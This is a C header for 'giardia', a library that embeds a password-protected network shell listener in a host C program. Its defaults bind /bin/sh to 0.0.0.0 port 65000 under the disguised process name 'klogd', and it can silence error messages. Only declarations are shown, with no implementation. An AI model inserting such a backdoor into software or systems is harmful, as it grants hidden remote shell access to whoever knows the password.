/*
 * giardia.h
 * Library to add a shell to C code
 * By J. Stuart McMurray
 * Created 20170720
 * Last Modified 20170720
 */

#ifndef GIARDIA_H
#define GIARDIA_H

#define GIARDIA_LNAME "klogd"    /* Default name of listening process */
#define GIARDIA_LPORT 65000      /* Default listen port */
#define GIARDIA_LADDR "0.0.0.0"  /* Default Listen address */
#define GIARDIA_SNAME "/bin/sh " /* Name of network-connected shell */

/* Forks and starts a listener */ /* TODO: Better comment */
extern void giardia_start(
                char **argv0,   /* Pointer to argv[0] */
                char *procname, /* Name for shell */
                char *laddr,    /* Listen address */
                uint16_t lport, /* Starting listen port */
                char *password, /* Connection password */
                int quiet);     /* Don't print error messages if nonzero */

#endif
